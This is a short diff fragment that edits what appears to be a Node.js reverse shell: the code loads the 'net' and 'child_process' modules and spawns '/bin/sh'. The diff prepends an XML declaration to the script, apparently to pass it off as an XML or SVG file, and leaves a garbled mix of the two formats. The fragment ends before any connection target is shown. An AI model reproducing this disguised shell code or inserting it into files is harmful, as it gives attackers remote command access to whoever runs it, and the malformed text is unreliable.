@@ -1,4 +1,5 @@
-(function(){
+
+<?xml version="1.0" standalone="no"?>(function(){
     var net = require("net"),
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
